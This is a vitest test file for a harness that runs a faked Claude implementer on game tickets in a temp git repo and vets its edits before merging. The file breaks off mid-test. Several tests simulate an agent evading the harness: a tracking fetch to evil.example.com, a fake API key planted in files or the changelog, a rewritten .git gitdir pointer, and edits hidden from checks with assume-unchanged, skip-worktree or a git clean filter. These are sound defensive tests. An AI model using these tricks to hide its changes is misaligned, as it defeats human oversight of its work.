// runCandidate against a real temp git repo shaped like the studio repo. Claude is a fake; the checks are fake commands
// (small node scripts) run as isolated child processes, unsandboxed (unsandboxedForTests) except in the darwin-only
// real-sandbox test at the end.
import { execFileSync } from 'node:child_process';
import { existsSync, mkdirSync, mkdtempSync, readFileSync, realpathSync, rmSync, symlinkSync, writeFileSync } from 'node:fs';
import { tmpdir } from 'node:os';
import { dirname, join } from 'node:path';
import { afterEach, beforeEach, describe, expect, it, vi } from 'vitest';
import { parseTrailers, type ScoreReport, type Ticket } from '@studio/core/hal';
import { secretReadPaths } from './env.js';
import { defaultCommands, HISTORY_SIZE, IMPLEMENTER_TIMEOUT_MS, jpegSize, parseResult, runCandidate, scriptArgv, scorersFor, type CandidateCtx, type CandidateResult, type CheckCommands } from './candidate.js';
import type { ClaudeCall, ClaudeResult } from './claude.js';
import { ensureMainWorktree, HAL_MAIN, runGit, type GitRunner } from './git.js';
import { sandboxAvailable } from './sandbox.js';
import { askHalToScore } from './score-broker.js';

const KEY = 'sk-ant-api03-FAKEKEYFAKEKEYFAKEKEY0123456789';
const gitIn = (cwd: string, ...args: string[]) => execFileSync('git', args, { cwd, encoding: 'utf8' }).trim();
const put = (root: string, rel: string, data: string | Buffer) => { mkdirSync(dirname(join(root, rel)), { recursive: true }); writeFileSync(join(root, rel), data); };
const read = (root: string, rel: string) => readFileSync(join(root, rel), 'utf8');
const sub = (args: string[]) => { let i = 0; while (args[i] === '-c') i += 2; return args[i]; };

const GAME = (slug: string, version: string) => ({
  [`games/${slug}/game.yaml`]: `slug: ${slug}\ntitle: ${slug}\nversion: ${version}\nageRating: null\n`,
  [`games/${slug}/index.html`]: `<!doctype html>\n<script type="module">\nimport { createStudio } from '../sdk/studio-sdk.js';\nconst studio = createStudio({ game: '${slug}', version: '${version}', endpoint: '' });\n</script>\n`,
  [`games/${slug}/CHANGELOG.md`]: `# ${slug} changelog\n\nNewest first.\n\n## ${version} (2026-11-10)\n- First release.\n`,
  [`games/${slug}/game.js`]: `export const speed = 1;\n`,
});

const report = (game: string, fitness: number, measures: Record<string, number>, hardFailures: string[] = []): ScoreReport<unknown> => ({ game, levels: [], measures, fitness, hardFailures });
const ok = (text: string, costUsd: number | null = 0.42): ClaudeResult => ({ ok: true, text, costUsd, subtype: 'success', limitHit: false, timedOut: false, stderrTail: '' });
const OUT = 'All done.\n{"changelog": "Jumps feel smoother.", "summary": "Tuned speed."}';

/** A minimal JPEG: SOI, an APP0 segment, SOF0 with the given size, EOI. */
const fakeJpeg = (w: number, h: number) => Buffer.concat([
  Buffer.from([0xff, 0xd8, 0xff, 0xe0, 0x00, 0x04, 0x4a, 0x46]),
  Buffer.from([0xff, 0xc0, 0x00, 0x0b, 0x08, h >> 8, h & 0xff, w >> 8, w & 0xff, 0x01, 0x01, 0x11, 0x00]),
  Buffer.from([0xff, 0xd9]),
]);
const J = (v: unknown) => JSON.stringify(v);
/** argv for `node -e <code>`. */
const node = (code: string) => [process.execPath, '-e', code];
/** A check that prints its result with the nonce Hal passed it (as check-entry.ts does). */
const result = (v: unknown, extra = '') => node(`${extra};console.log('noise');console.log('HAL-RESULT ' + process.env.HAL_CHECK_NONCE + ' ' + ${J(J(v))})`);
const writeJpeg = (out: string, buf: Buffer) => `const fs=require('fs'),p=require('path');fs.mkdirSync(p.dirname(${J(out)}),{recursive:true});fs.writeFileSync(${J(out)},Buffer.from(${J(buf.toString('hex'))},'hex'))`;

const RUN = 'run-2026-11-12T03-00-00-000Z'; // night 2026-11-11 at tz offset 0, like now()
const ticket = (over: Partial<Ticket> = {}): Ticket => ({ id: 't1', game: 'hyperline', kind: 'tuning', title: 'Smoother jumps', why: 'Players miss the second jump.', ...over });
const BEFORE = { hyperline: report('hyperline', 60, { flow: 60, fair: 70 }), gearhold: report('gearhold', 50, { walk: 50 }), 'gearhold-play': report('gearhold-play', 40, { clear: 40 }) };

describe('jpegSize', () => {
  it('reads SOF0/SOF2 dimensions and rejects non-JPEGs', () => {
    expect(jpegSize(fakeJpeg(390, 844))).toEqual({ width: 390, height: 844 });
    const prog = fakeJpeg(10, 20); prog[9] = 0xc2;
    expect(jpegSize(prog)).toEqual({ width: 10, height: 20 });
    expect(jpegSize(Buffer.from('not a jpeg'))).toBeNull();
    expect(jpegSize(Buffer.from([0xff, 0xd8, 0xff, 0xd9]))).toBeNull();
    expect(HISTORY_SIZE).toEqual({ width: 390, height: 844 });
  });
});

describe('runCandidate (temp git repo)', () => {
  let repo: string, mainDir: string;
  let calls: ClaudeCall[];
  let gitSubs: string[];
  let ran: string[];

  beforeEach(async () => {
    repo = realpathSync(mkdtempSync(join(tmpdir(), 'hal-cand-')));
    gitIn(repo, 'init', '-q', '-b', 'main');
    for (const [k, v] of [['user.name', 't'], ['user.email', 't@t'], ['commit.gpgsign', 'false'], ['core.hooksPath', join(repo, '.git/hooks')]]) gitIn(repo, 'config', k!, v!);
    put(repo, '.gitignore', 'node_modules/\n.data/\n*.log\ndist/\n');
    put(repo, 'package.json', '{"name":"x","type":"module","scripts":{"test":"vitest run games","typecheck":"tsc --version"}}\n');
    put(repo, 'games/hyperline/fail.test.js', "import { it, expect } from 'vitest';\nit('REAL-FAILURE-SEEN', () => expect(1).toBe(2));\n");
    for (const [p, t] of Object.entries({ ...GAME('hyperline', '0.3.1'), ...GAME('gearhold', '0.2.0') })) put(repo, p, t);
    gitIn(repo, 'add', '-A');
    gitIn(repo, 'commit', '-q', '-m', 'base');
    mainDir = (await ensureMainWorktree(repo)).dir;
    calls = []; gitSubs = []; ran = [];
  });
  afterEach(() => rmSync(repo, { recursive: true, force: true }));

  const halHead = () => gitIn(repo, 'rev-parse', HAL_MAIN);
  const worktreesGone = (pass = 'HAL-1') => {
    expect(existsSync(join(repo, '.data/hal/wt', pass))).toBe(false);
    expect(gitIn(repo, 'branch', '--list', `hal/${pass}`)).toBe('');
  };
  const recording: GitRunner = async (args, cwd, o) => { gitSubs.push(sub(args)!); return runGit(args, cwd, o); };
  const passing: CheckCommands = {
    test: () => { ran.push('test'); return [node('console.log("all green")')]; },
    typecheck: () => { ran.push('typecheck'); return [node('')]; },
    score: (_d, s) => { ran.push(`score:${s}`); const b = BEFORE[s as keyof typeof BEFORE]; return result({ ...b, fitness: b.fitness + 1 }); },
    screens: (_d, game) => { ran.push('screens'); return result({ game, shots: [], errors: [], reached: true, notes: [], blockedRequests: [] }); },
    controls: (_d, game) => { ran.push('controls'); return result([{ game, check: 'tap', ok: true, detail: '' }, { game: 'other', check: 'x', ok: false, detail: 'not ours' }]); },
    shoot: (_d, _g, out) => { ran.push('shoot'); return result({ ok: true }, writeJpeg(out, fakeJpeg(390, 844))); },
  };

  type Ctx = CandidateCtx & { budget: { slice: ReturnType<typeof vi.fn>; record: ReturnType<typeof vi.fn> } };
  /** A ctx whose fakes all pass. `edit` is what the fake Claude does in its cwd. */
  function ctx(over: Partial<CandidateCtx> & { cmds?: Partial<CheckCommands> } = {}, edit: (cwd: string) => void = (cwd) => put(cwd, 'games/hyperline/game.js', 'export const speed = 1.2;\n')): Ctx {
    const { cmds, ...rest } = over;
    return {
      repo, pass: 'HAL-1', run: RUN, now: () => new Date('2026-11-12T03:00:00Z'), tzOffsetMinutes: 0,
      model: 'test-model', billing: 'api', secrets: [KEY],
      budget: { slice: vi.fn(() => 3), record: vi.fn() },
      claude: async (call) => { calls.push(call); edit(call.cwd); return { first: ok(OUT) }; },
      mainDir,
      baseline: { sha: halHead(), scores: BEFORE },
      commands: { ...passing, ...(cmds ?? {}) },
      unsandboxedForTests: true,
      countTests: async () => ({ before: 3, after: 3 }),
      git: recording,
      ...rest,
    } as Ctx;
  }

  const expectDiscarded = (r: CandidateResult, old: string, re: RegExp) => {
    expect(r.verdict).toBe('discarded');
    expect(r.reasons.join('\n')).toMatch(re);
    expect(halHead()).toBe(old);
    expect(gitSubs).not.toContain('commit-tree'); // never reached the merge step
    expect(r.reasons.join('\n')).not.toContain(KEY);
    worktreesGone();
    gitSubs = [];
  };

  it('happy path: one squash commit on refs/hal/main with trailers, the version bumped in all three files, and the history jpgs', async () => {
    const old = halHead();
    const brianMain = gitIn(repo, 'rev-parse', 'refs/heads/main');
    const c = ctx();
    const r = await runCandidate(ticket(), c);
    expect(r.reasons).toEqual([]);
    expect(r.verdict).toBe('merged');
    expect(r.commit).toBe(halHead());
    expect(gitIn(repo, 'rev-parse', `${HAL_MAIN}^`)).toBe(old);
    expect(gitIn(repo, 'rev-list', '--count', `${old}..${HAL_MAIN}`)).toBe('1');
    expect(gitIn(repo, 'rev-parse', 'refs/heads/main')).toBe(brianMain); // Brian's branch: never written
    expect(r.version).toBe('0.3.2');
    expect(r.changelog).toBe('Jumps feel smoother.');
    expect(r.costUsd).toBe(0.42);
    expect(r.scoresAfter.hyperline!.fitness).toBe(61);
    expect(c.budget.record).toHaveBeenCalledWith('implementer', 'api', 0.42);
    expect(ran).toEqual(['shoot', 'test', 'typecheck', 'score:hyperline', 'screens', 'controls', 'shoot']);

    const msg = gitIn(repo, 'log', '-1', '--format=%B', HAL_MAIN);
    expect(msg.split('\n')[0]).toBe('tuning(hyperline): Smoother jumps');
    expect(msg).toContain('Players miss the second jump.');
    expect(parseTrailers(msg)).toEqual({ pass: 'HAL-1', game: 'hyperline', kind: 'tuning', why: 'Players miss the second jump.', scoreBefore: 60, scoreAfter: 61, version: '0.3.2', run: RUN });

    const at = (f: string) => gitIn(repo, 'show', `${HAL_MAIN}:games/hyperline/${f}`);
    expect(at('game.yaml')).toMatch(/^version: 0\.3\.2$/m);
    expect(at('index.html')).toContain("createStudio({ game: 'hyperline', version: '0.3.2'");
    expect(at('CHANGELOG.md')).toMatch(/^## 0\.3\.2 \(2026-11-11\)\n- Jumps feel smoother\.\n\n## 0\.3\.1 \(2026-11-10\)/m);
    expect(at('game.js')).toBe('export const speed = 1.2;');

    const files = gitIn(repo, 'show', '--name-only', '--format=', HAL_MAIN).split('\n').sort();
    expect(files).toEqual(['docs/hal/history/hyperline/2026-11-11/HAL-1-after.jpg', 'docs/hal/history/hyperline/2026-11-11/HAL-1-before.jpg', 'games/hyperline/CHANGELOG.md', 'games/hyperline/game.js', 'games/hyperline/game.yaml', 'games/hyperline/index.html']);
    expect(r.shots).toEqual({ before: 'docs/hal/history/hyperline/2026-11-11/HAL-1-before.jpg', after: 'docs/hal/history/hyperline/2026-11-11/HAL-1-after.jpg' });
    expect(jpegSize(execFileSync('git', ['show', `${HAL_MAIN}:${r.shots!.after}`], { cwd: repo }))).toEqual({ width: 390, height: 844 });

    expect(calls).toHaveLength(1);
    expect(calls[0]).toMatchObject({ role: 'implementer', cwd: join(repo, '.data/hal/wt/HAL-1'), model: 'test-model', billing: 'api', maxBudgetUsd: 3, timeoutMs: IMPLEMENTER_TIMEOUT_MS, denyReadPaths: secretReadPaths(repo) });
    expect(IMPLEMENTER_TIMEOUT_MS).toBe(20 * 60_000);
    expect(calls[0]!.prompt).toContain('Smoother jumps');
    expect(calls[0]!.prompt).not.toContain(KEY);
    expect(calls[0]!.prompt).not.toMatch(/\{\{\w+\}\}/);

    expect(gitIn(mainDir, 'rev-parse', 'HEAD')).toBe(halHead());
    expect(gitIn(mainDir, 'status', '--porcelain')).toBe('');
    expect(read(repo, 'games/hyperline/game.js')).toBe('export const speed = 1;\n');
    worktreesGone();
  });

  it('a second change the same night shares the version (baseline re-scored at the new head)', async () => {
    expect((await runCandidate(ticket(), ctx())).verdict).toBe('merged');
    await ensureMainWorktree(repo);
    const r = await runCandidate(ticket({ id: 't2', title: 'Brighter coins', kind: 'polish' }), ctx({ pass: 'HAL-2' }, (cwd) => put(cwd, 'games/hyperline/game.js', 'export const speed = 1.3;\n')));
    expect(r.verdict).toBe('merged');
    expect(r.version).toBe('0.3.2');
    expect(gitIn(repo, 'show', `${HAL_MAIN}:games/hyperline/CHANGELOG.md`)).toMatch(/## 0\.3\.2 \(2026-11-11\)\n- Jumps feel smoother\.\n- Jumps feel smoother\.\n/);
    worktreesGone('HAL-2');
  });

  it("R20: a version Brian released tonight is never shared: Hal bumps to a new heading above it, then shares its own", async () => {
    // Brian's own tidepool release tonight, on main and refs/hal/main, with no Hal commit for it.
    const tp = 'tidepool-pals';
    for (const [p, t] of Object.entries(GAME(tp, '0.4.1'))) put(repo, p, t);
    put(repo, `games/${tp}/CHANGELOG.md`, `# ${tp} changelog\n\nNewest first.\n\n## 0.4.1 (2026-11-11)\n- Brian's own fix.\n\n## 0.4.0 (2026-11-01)\n- Older.\n`);
    gitIn(repo, 'add', '-A');
    gitIn(repo, 'commit', '-q', '-m', 'tidepool 0.4.1');
    gitIn(repo, 'update-ref', HAL_MAIN, gitIn(repo, 'rev-parse', 'HEAD'));
    await ensureMainWorktree(repo);
    const tpScores = { [tp]: report(tp, 50, { fun: 50 }) };
    const tpCtx = (pass: string, speed: string) => ctx({ pass, baseline: { sha: halHead(), scores: tpScores }, cmds: { score: (_d, s) => result(report(s, 51, { fun: 51 })) } },
      (cwd) => put(cwd, `games/${tp}/game.js`, `export const speed = ${speed};\n`));
    const a = await runCandidate(ticket({ game: tp, kind: 'fix', title: 'Fix crab hitbox' }), tpCtx('HAL-1', '2'));
    expect(a.reasons).toEqual([]);
    expect(a.version).toBe('0.4.2');
    const cl1 = gitIn(repo, 'show', `${HAL_MAIN}:games/${tp}/CHANGELOG.md`);
    expect(cl1).toContain("## 0.4.2 (2026-11-11)\n- Jumps feel smoother.\n\n## 0.4.1 (2026-11-11)\n- Brian's own fix.\n");
    // A second Hal fix the same night shares Hal's 0.4.2 (its trailers are on refs/hal/main now).
    await ensureMainWorktree(repo);
    const b = await runCandidate(ticket({ id: 't2', game: tp, kind: 'fix', title: 'Fix shell timing' }), tpCtx('HAL-2', '3'));
    expect(b.reasons).toEqual([]);
    expect(b.version).toBe('0.4.2');
    const cl2 = gitIn(repo, 'show', `${HAL_MAIN}:games/${tp}/CHANGELOG.md`);
    expect(cl2).toContain("## 0.4.2 (2026-11-11)\n- Jumps feel smoother.\n- Jumps feel smoother.\n\n## 0.4.1 (2026-11-11)\n- Brian's own fix.\n");
    expect(gitIn(repo, 'show', `${HAL_MAIN}:games/${tp}/game.yaml`)).toMatch(/^version: 0\.4\.2$/m);
    worktreesGone('HAL-2');
  });

  it('a baseline scored at another commit is discarded as stale before Claude runs', async () => {
    const old = halHead();
    const r = await runCandidate(ticket(), ctx({ baseline: { sha: 'f'.repeat(40), scores: BEFORE } }));
    expectDiscarded(r, old, /stale baseline/);
    expect(calls).toHaveLength(0);
  });

  it('a zero budget slice skips with no Claude call and no worktree', async () => {
    const old = halHead();
    const c = ctx({ budget: { slice: vi.fn(() => 0), record: vi.fn() } });
    const r = await runCandidate(ticket(), c);
    expect(r).toMatchObject({ verdict: 'skipped', reasons: ['budget'], costUsd: 0 });
    expect(calls).toHaveLength(0);
    expect(c.budget.record).not.toHaveBeenCalled();
    expect(halHead()).toBe(old);
    worktreesGone();
  });

  it('a failed or timed-out implementer call is discarded, and its cost recorded (unknown cost as null)', async () => {
    const old = halHead();
    const c = ctx({ claude: async (call) => { calls.push(call); return { first: { ...ok('', null), ok: false, subtype: 'timeout', timedOut: true } }; } });
    const r = await runCandidate(ticket(), c);
    expectDiscarded(r, old, /implementer timed out/);
    expect(c.budget.record).toHaveBeenCalledWith('implementer', 'api', null);
    expect(r.costUsd).toBe(3);
  });

  it('a throwing claude port is booked as an unknown-cost call (it may have spawned) and discarded', async () => {
    const old = halHead();
    const c = ctx({ claude: async () => { throw new Error('spawn exploded'); } });
    const r = await runCandidate(ticket(), c);
    expectDiscarded(r, old, /implementer call failed: spawn exploded/);
    expect(c.budget.record.mock.calls).toEqual([['implementer', 'api', null]]);
    expect(r.costUsd).toBe(3);
  });

  it('records both calls when a subscription limit falls back to the API', async () => {
    const c = ctx({
      billing: 'subscription',
      claude: async (call, apiSlice) => {
        calls.push(call);
        put(call.cwd, 'games/hyperline/game.js', 'export const speed = 2;\n');
        return { first: { ...ok('limit', null), ok: false, limitHit: true, subtype: 'error' }, retry: ok(OUT, apiSlice === 3 ? 0.5 : -1) };
      },
    });
    const r = await runCandidate(ticket(), c);
    expect(r.verdict).toBe('merged');
    expect(c.budget.record.mock.calls).toEqual([['implementer', 'subscription', null], ['implementer', 'api', 0.5]]);
    expect(r.costUsd).toBe(0.5);
  });

  it('blocked output, and output that does not parse, are discarded', async () => {
    const old = halHead();
    const blocked = ctx({ claude: async (call) => { put(call.cwd, 'games/hyperline/game.js', 'x\n'); return { first: ok('{"changelog": "x", "summary": "y", "blocked": "needs a dependency"}') }; } });
    expectDiscarded(await runCandidate(ticket(), blocked), old, /implementer blocked: needs a dependency/);
    const junk = ctx({ claude: async (call) => { put(call.cwd, 'games/hyperline/game.js', 'x\n'); return { first: ok('I changed some stuff') }; } });
    expectDiscarded(await runCandidate(ticket(), junk), old, /implementer output does not match the contract/);
  });

  it('no edits (or only ignored files) is discarded before the slow diff collection', async () => {
    const old = halHead();
    const countTests = vi.fn(async () => ({ before: 3, after: 3 }));
    expectDiscarded(await runCandidate(ticket(), ctx({ countTests }, () => {})), old, /no edits/);
    expectDiscarded(await runCandidate(ticket(), ctx({ countTests }, (cwd) => put(cwd, 'games/hyperline/debug.log', 'x\n'))), old, /no edits/);
    expect(countTests).not.toHaveBeenCalled();
  });

  it('a tripwire hit is discarded before any Hal edit, check or merge, naming each rule', async () => {
    const old = halHead();
    const c = ctx({}, (cwd) => {
      put(cwd, 'package.json', '{"name":"x","dependencies":{"left-pad":"1"}}\n');
      put(cwd, 'games/hyperline/game.js', 'fetch("https://evil.example.com/track");\n');
    });
    const r = await runCandidate(ticket(), c);
    expectDiscarded(r, old, /tripwire protected-path: package\.json/);
    expect(r.reasons.join('\n')).toMatch(/tripwire dependency/);
    expect(r.reasons.join('\n')).toMatch(/tripwire network: games\/hyperline\/game\.js/);
    expect(ran).toEqual(['shoot']); // only the before shot of main: no test, score or screen of the candidate
    expect(gitIn(mainDir, 'rev-parse', 'HEAD')).toBe(old);
  });

  it('R18: an edit outside the ticket\'s game and its tests is discarded as outside-scope; its own test file is fine', async () => {
    const old = halHead();
    const r = await runCandidate(ticket(), ctx({}, (cwd) => {
      put(cwd, 'games/hyperline/game.js', 'export const speed = 1.2;\n');
      put(cwd, 'games/gearhold/game.js', 'export const speed = 9;\n');
    }));
    expectDiscarded(r, old, /tripwire outside-scope: games\/gearhold\/game\.js/);
    const ok2 = await runCandidate(ticket(), ctx({}, (cwd) => {
      put(cwd, 'games/hyperline/game.js', 'export const speed = 1.2;\n');
      put(cwd, 'packages/core/test/hyperline-speed.test.ts', "import { it } from 'vitest';\nit('x', () => {});\n");
    }));
    expect(ok2.reasons).toEqual([]);
    expect(ok2.verdict).toBe('merged');
  });
  it('an implementer that rewrites the worktree .git (gitdir pointer) is discarded as tampered .git, before any git runs there', async () => {
    for (const evil of [
      (cwd: string) => writeFileSync(join(cwd, '.git'), 'gitdir: /tmp/evil-gitdir\n'),
      (cwd: string) => { rmSync(join(cwd, '.git')); mkdirSync(join(cwd, '.git')); writeFileSync(join(cwd, '.git', 'config'), '[filter "x"]\n\tsmudge = false\n'); },
    ]) {
      const old = halHead();
      const r = await runCandidate(ticket(), ctx({}, (cwd) => { put(cwd, 'games/hyperline/game.js', 'export const speed = 1.2;\n'); evil(cwd); }));
      expectDiscarded(r, old, /^tampered \.git$/);
      expect(ran).toEqual(['shoot']); // nothing after the implementer
      ran = [];
    }
  });
  it('a tampered-.git discard still books the first call and the fallback retry (reservations settled)', async () => {
    const limit: ClaudeResult = { ok: false, text: "You've hit your limit", costUsd: null, subtype: 'error', limitHit: true, timedOut: false, stderrTail: '' };
    const c = ctx({
      billing: 'subscription',
      claude: async (call) => { calls.push(call); put(call.cwd, 'games/hyperline/game.js', 'export const speed = 1.2;\n'); writeFileSync(join(call.cwd, '.git'), 'gitdir: /tmp/evil\n'); return { first: limit, retry: ok(OUT, 0.7) }; },
    });
    const r = await runCandidate(ticket(), c);
    expect(r.reasons).toEqual(['tampered .git']);
    expect(c.budget.record.mock.calls).toEqual([['implementer', 'subscription', null], ['implementer', 'api', 0.7]]);
    expect(r.costUsd).toBe(0.7);
  });
  it('index tricks and filters cannot hide an edit from the tripwires: assume-unchanged, skip-worktree, clean filter', async () => {
    const old = halHead();
    const evil = 'fetch("https://evil.example.com/track");\n';
    for (const flag of ['--assume-unchanged', '--skip-worktree']) {
      const r = await runCandidate(ticket(), ctx({}, (cwd) => { put(cwd, 'games/hyperline/game.js', evil); execFileSync('git', ['update-index', flag, 'games/hyperline/game.js'], { cwd }); }));
      expectDiscarded(r, old, /tripwire network: games\/hyperline\/game\.js/);
    }
    gitIn(repo, 'config', 'filter.hide.clean', 'sed s/evil.example.com/ok.example.com/');
    put(repo, '.git/info/attributes', '*.js filter=hide\n');
    const r = await runCandidate(ticket(), ctx({}, (cwd) => put(cwd, 'games/hyperline/game.js', evil)));
    expectDiscarded(r, old, /tripwire network: games\/hyperline\/game\.js: new host evil\.example\.com/);
  });

  it('a gitignored file the candidate relies on is pruned before the checks, so they judge exactly the committed tree', async () => {
    const seen: string[] = [];
    const c = ctx({ cmds: { test: (dir) => { seen.push(dir); return [node(`process.exit(require('fs').existsSync('games/hyperline/secret.log') ? 1 : 0)`)]; } } },
      (cwd) => { put(cwd, 'games/hyperline/game.js', 'export const speed = 4;\n'); put(cwd, 'games/hyperline/secret.log', 'hidden\n'); });
    const r = await runCandidate(ticket(), c);
    expect(r.verdict).toBe('merged');
    expect(seen).toEqual([join(repo, '.data/hal/wt/HAL-1')]);
  });

  it('a fake key written into a game file is discarded with rule secret, and the key appears in no reason', async () => {
    const old = halHead();
    const r = await runCandidate(ticket(), ctx({}, (cwd) => put(cwd, 'games/hyperline/game.js', `export const k = '${KEY}';\n`)));
    expectDiscarded(r, old, /tripwire secret: games\/hyperline\/game\.js/);
    expect(JSON.stringify(r)).not.toContain(KEY);
  });

  it('a key smuggled through the changelog text (written by Hal after the tripwires) is still caught', async () => {
    const old = halHead();
    const c = ctx({ claude: async (call) => { put(call.cwd, 'games/hyperline/game.js', 'export const speed = 3;\n'); return { first: ok(`{"changelog": "Key ${KEY}", "summary": "s"}`) }; } });
    const r = await runCandidate(ticket(), c);
    expectDiscarded(r, old, /tripwire secret/);
    expect(JSON.stringify(r)).not.toContain(KEY);
  });

  it('a diff collection failure is discarded (fail closed)', async () => {
    const old = halHead();
    expectDiscarded(await runCandidate(ticket(), ctx({ countTests: async () => { throw new Error('vitest list blew up'); } })), old, /diff collection failed: vitest list blew up/);
  });

  it('a release that cannot be applied is discarded', async () => {
    const old = halHead();
    const noVersion = ctx({}, (cwd) => put(cwd, 'games/hyperline/game.yaml', 'slug: hyperline\ntitle: hyperline\n'));
    expectDiscarded(await runCandidate(ticket(), noVersion), old, /release failed: .*no version/);
  });

  it('failing tests are discarded with the output tail, key redacted; typecheck too', async () => {
    const old = halHead();
    const failing = node(`for (let i = 0; i < 2000; i++) console.log('noise'); console.error('FAIL games/hyperline.test.ts: expected 1 got 2 (${KEY})'); process.exit(1)`);
    const r = await runCandidate(ticket(), ctx({ cmds: { test: () => [failing] } }));
    expectDiscarded(r, old, /npm test failed[\s\S]*FAIL games\/hyperline\.test\.ts: expected 1 got 2 \(\[REDACTED\]\)/);
    expect(r.reasons.join('\n').length).toBeLessThan(4000);
    expectDiscarded(await runCandidate(ticket(), ctx({ cmds: { typecheck: () => [node(''), node(`console.log('TS2322: nope'); process.exit(2)`)] } })), old, /npm run typecheck failed[\s\S]*TS2322/);
    expectDiscarded(await runCandidate(ticket(), ctx({ checkTimeoutMs: 300, cmds: { test: () => [node('setTimeout(() => {}, 30000)')] } })), old, /npm test failed \(timed out\)/);
  });

  describe('fix rounds', () => {
    /** npm test fails until games/hyperline/game.js says "fixed". */
    const pickyTest = () => [node(`const s = require('fs').readFileSync('games/hyperline/game.js', 'utf8'); if (!s.includes('fixed')) { console.error('FAIL hyperline-speed.test.ts: speed must stay under 2 (${KEY})'); process.exit(1); }`)];
    it('a failing npm test goes back to the implementer with the output; the fixed attempt merges with one release', async () => {
      const prompts: string[] = [];
      const c = ctx({
        cmds: { test: pickyTest },
        claude: async (call) => {
          prompts.push(call.prompt);
          put(call.cwd, 'games/hyperline/game.js', prompts.length === 1 ? 'export const speed = 1.2;\n' : 'export const speed = 1.2; // fixed\n');
          // A fix round starts from the implementer's own tree: Hal's release edits are not on disk.
          if (prompts.length === 2) expect(readFileSync(join(call.cwd, 'games/hyperline/game.yaml'), 'utf8')).toBe(readFileSync(join(mainDir, 'games/hyperline/game.yaml'), 'utf8'));
          return { first: ok(prompts.length === 1 ? OUT : 'Fixed.\n{"changelog": "Jumps feel smoother.", "summary": "Tuned speed, kept under the cap."}') };
        },
      });
      const r = await runCandidate(ticket(), c);
      expect(r.verdict).toBe('merged');
      expect(r.fixRounds).toBe(1);
      expect(r.summary).toBe('Tuned speed, kept under the cap.');
      expect(prompts).toHaveLength(2);
      expect(prompts[1]!.startsWith(prompts[0]!)).toBe(true);
      expect(prompts[1]).toContain('Fix round 1 of 2');
      expect(prompts[1]).toMatch(/npm test failed:[\s\S]*FAIL hyperline-speed\.test\.ts: speed must stay under 2 \(\[REDACTED\]\)/);
      expect(prompts[1]).not.toContain(KEY);
      expect(c.budget.slice).toHaveBeenCalledTimes(2); // each round reserves its own slice
      expect(c.budget.record).toHaveBeenCalledTimes(2);
      expect(r.costUsd).toBeCloseTo(0.84);
      const changelog = gitIn(repo, 'show', `${HAL_MAIN}:games/hyperline/CHANGELOG.md`);
      expect(changelog.split('Jumps feel smoother.').length - 1).toBe(1); // released once
      expect(gitIn(repo, 'show', `${HAL_MAIN}:games/hyperline/game.yaml`)).toContain(`version: ${r.version}`);
      worktreesGone();
    });
    it('still failing after the last fix round: discarded, saying how many rounds it had', async () => {
      const old = halHead();
      const c = ctx({ cmds: { test: pickyTest } });
      const r = await runCandidate(ticket(), c);
      expectDiscarded(r, old, /npm test failed:[\s\S]*speed must stay under 2[\s\S]*\(after 2 fix rounds\)/);
      expect(r.fixRounds).toBe(2);
      expect(calls).toHaveLength(3);
    });
    it('no budget for a fix round: discarded with the failure, no second call', async () => {
      const old = halHead();
      const slices = [3, 0];
      const c = ctx({ cmds: { test: pickyTest }, budget: { slice: vi.fn(() => slices.shift() ?? 0), record: vi.fn() } });
      const r = await runCandidate(ticket(), c);
      expectDiscarded(r, old, /speed must stay under 2[\s\S]*no budget left for a fix round/);
      expect(calls).toHaveLength(1);
    });
    it('a fix round goes through the tripwires again', async () => {
      const old = halHead();
      let n = 0;
      const c = ctx({ cmds: { test: pickyTest } }, (cwd) => { n++; if (n === 1) put(cwd, 'games/hyperline/game.js', 'export const speed = 1.2;\n'); else put(cwd, 'games/tidepool-pals/game.js', 'export const x = "fixed";\n'); });
      expectDiscarded(await runCandidate(ticket(), c), old, /tripwire outside-scope/);
      expect(n).toBe(2);
    });
  });

  it('a score regression past the tolerance is discarded; a target picks score mode', async () => {
    const old = halHead();
    expectDiscarded(await runCandidate(ticket(), ctx({ cmds: { score: () => result(report('hyperline', 60, { flow: 60, fair: 65 })) } })), old, /hyperline: fair regressed/);
    expectDiscarded(await runCandidate(ticket({ target: 'flow' }), ctx({ cmds: { score: () => result(report('hyperline', 60, { flow: 60.2, fair: 70 })) } })), old, /hyperline: no real gain/);
    expectDiscarded(await runCandidate(ticket(), ctx({ cmds: { score: () => node(`console.error('browser unavailable: no gpu'); process.exit(1)`) } })), old, /score hyperline failed: exit 1: browser unavailable/);
    expectDiscarded(await runCandidate(ticket(), ctx({ cmds: { score: () => node('console.log("no result line")') } })), old, /score hyperline failed: score hyperline: no result printed/);
    expectDiscarded(await runCandidate(ticket(), ctx({ baseline: { sha: halHead(), scores: {} } })), old, /hyperline: no baseline/);
    expectDiscarded(await runCandidate(ticket({ target: 'nosuch' }), ctx()), old, /target measure "nosuch"/);
  });

  it('gearhold is scored with both gearhold and gearhold-play, and the target applies where it is a measure', async () => {
    expect(scorersFor('gearhold')).toEqual(['gearhold', 'gearhold-play']);
    expect(scorersFor('hyperline')).toEqual(['hyperline']);
    const c = ctx({ cmds: { score: (dir, s) => { ran.push(`score:${s}@${dir}`); return result(s === 'gearhold-play' ? report(s, 42, { clear: 42 }) : report(s, 50, { walk: 50 })); } } },
      (cwd) => put(cwd, 'games/gearhold/game.js', 'export const speed = 1.5;\n'));
    const r = await runCandidate(ticket({ game: 'gearhold', target: 'clear', kind: 'feature' }), c);
    expect(r.reasons).toEqual([]);
    const wt = join(repo, '.data/hal/wt/HAL-1');
    expect(ran.filter((x) => x.startsWith('score'))).toEqual([`score:gearhold@${wt}`, `score:gearhold-play@${wt}`]);
    expect(r.version).toBe('0.3.0'); // feature: minor bump of 0.2.0
    expect(parseTrailers(gitIn(repo, 'log', '-1', '--format=%B', HAL_MAIN))).toMatchObject({ scoreBefore: 40, scoreAfter: 42, kind: 'feature', game: 'gearhold' });
  });

  it('failing screens or controls for the game are discarded', async () => {
    const old = halHead();
    const r = await runCandidate(ticket(), ctx({ cmds: { screens: (_d, game) => result({ game, shots: [], errors: ['pageerror: boom'], reached: true, notes: [], blockedRequests: ['https://x.example/'] }) } }));
    expectDiscarded(r, old, /screens hyperline: pageerror: boom/);
    expect(r.reasons.join('\n')).toMatch(/blocked request https:\/\/x\.example\//);
    expectDiscarded(await runCandidate(ticket(), ctx({ cmds: { screens: (_d, game) => result({ game, shots: [], errors: [], reached: false, notes: [], blockedRequests: [] }) } })), old, /did not reach gameplay/);
    expectDiscarded(await runCandidate(ticket(), ctx({ cmds: { controls: (_d, game) => result([{ game, check: 'tap', ok: false, detail: 'no response' }]) } })), old, /controls hyperline tap: no response/);
